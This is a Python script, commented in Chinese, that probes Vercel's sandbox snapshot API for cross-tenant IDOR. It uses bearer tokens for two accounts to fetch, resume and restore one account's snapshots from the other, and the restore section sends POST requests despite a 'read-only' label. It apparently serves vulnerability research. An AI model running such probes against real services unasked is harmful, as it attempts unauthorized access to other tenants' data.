# -*- coding: utf-8 -*-
"""快照 IDOR 只读测试 (v44s): attacker 主账号 vs victim 账号
1) 主账号: 列快照拿 id, GET 详情 (自账号基线)
2) victim 账号: 用主账号的快照 id GET 详情/列表 (跨租户探测, 只读)
3) victim 账号: 用主账号 sandbox name 尝试 resume (跨租户生命周期)"""
import sys, json, time, os
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_A = load_token(r'F:\scan\vercel_cookies.txt')
TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')
TEAM_A = 'team_GIy1SZ444lspqeNbh4r8uAUg'
PROJ_A = 'prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F'
TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

def api_tok(tok, method, path, body=None, timeout=60):
    import urllib.request, urllib.error
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + tok)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:400]
    except Exception as e:
        return -1, 'EXC %s' % e

def main():
    print('=== A1: attacker 自账号列快照 (基线) ===', flush=True)
    c, r = api_tok(TOK_A, 'GET', '/v2/sandboxes/snapshots?teamId=%s&project=%s&limit=5' % (TEAM_A, PROJ_A))
    print(c, (r or '')[:400], flush=True)
    snap_id = None
    try:
        d = json.loads(r)
        snaps = d.get('snapshots', [])
        for s in snaps:
            if s.get('status') == 'created':
                snap_id = s['id']
                break
    except Exception as e:
        print('parse err', e, flush=True)
    if not snap_id:
        print('no created snapshot, abort', flush=True)
        return
    print('attacker snapshot id =', snap_id, flush=True)

    print('=== A2: attacker GET 快照详情 (基线) ===', flush=True)
    for ep in ['/v2/snapshots/%s?teamId=%s' % (snap_id, TEAM_A),
               '/v2/sandboxes/snapshots/%s?teamId=%s&project=%s' % (snap_id, TEAM_A, PROJ_A)]:
        c, r = api_tok(TOK_A, 'GET', ep)
        print(ep[:60], '->', c, (r or '')[:300], flush=True)

    print('=== V1: victim GET attacker 的快照 (IDOR?) ===', flush=True)
    for ep in ['/v2/snapshots/%s?teamId=%s' % (snap_id, TEAM_V),
               '/v2/snapshots/%s?teamId=%s&projectId=%s' % (snap_id, TEAM_V, PROJ_V),
               '/v2/sandboxes/snapshots/%s?teamId=%s&project=%s' % (snap_id, TEAM_V, PROJ_V)]:
        c, r = api_tok(TOK_V, 'GET', ep)
        print(ep[:70], '->', c, (r or '')[:300], flush=True)

    print('=== V2: victim 用主账号 sandbox 名 resume (跨租户生命周期) ===', flush=True)
    for nm in ['v43pwn', 'snaptest44', 'udptest44']:
        c, r = api_tok(TOK_V, 'GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (nm, TEAM_V, PROJ_V))
        print('resume %s -> %d %s' % (nm, c, (r or '')[:200]), flush=True)

    print('=== V3: victim 恢复端点变体 (attacker snap_id) ===', flush=True)
    for ep, b in [
        ('/v2/sandboxes/snapshots/%s/restore?teamId=%s' % (snap_id, TEAM_V), {}),
        ('/v2/sandboxes/snapshots/%s/restore?teamId=%s&projectId=%s' % (snap_id, TEAM_V, PROJ_V), {}),
        ('/v2/sandboxes/snapshots/%s/restore?teamId=%s' % (snap_id, TEAM_V), {'name': 'v44idor'}),
        ('/v2/sandboxes/%s/snapshots/%s/restore?teamId=%s' % ('v44idor', snap_id, TEAM_V), {}),
    ]:
        c, r = api_tok(TOK_V, 'POST', ep, b, timeout=90)
        print(ep[:80], '->', c, (r or '')[:300], flush=True)

if __name__ == '__main__':
    main()
